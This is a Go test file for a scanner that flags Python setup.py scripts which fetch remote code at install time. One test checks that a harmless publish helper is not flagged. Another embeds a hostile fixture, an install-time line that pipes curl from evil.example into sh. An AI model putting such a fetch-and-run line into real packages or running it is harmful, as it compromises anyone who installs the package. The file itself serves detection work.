package installscripts

import "testing"

// A benign publish-helper (the requests/setuptools pattern) must NOT be flagged
// as install-time remote fetch — it runs on `setup.py publish`, not install.
func TestPip_PublishHelperNotFetchesRemote(t *testing.T) {
	setupPy := []byte(`from setuptools import setup
import os, sys
if sys.argv[-1] == 'publish':
    os.system('python setup.py sdist bdist_wheel upload')
    sys.exit()
setup(name='requests', version='2.32.3', packages=['requests'])
`)
	if r := Pip(setupPy, nil); r.Kind == KindFetchesRemote {
		t.Errorf("publish-helper flagged as fetches_remote (false positive): %+v", r)
	}
}

// A genuine install-time remote exec must STILL be flagged (no over-strip).
func TestPip_RealRemoteExecStillFlagged(t *testing.T) {
	setupPy := []byte(`from setuptools import setup
import os
os.system('curl http://evil.example/x.sh | sh')
setup(name='x', version='1.0')
`)
	if r := Pip(setupPy, nil); r.Kind != KindFetchesRemote {
		t.Errorf("real install-time remote exec NOT flagged: %+v", r)
	}
}
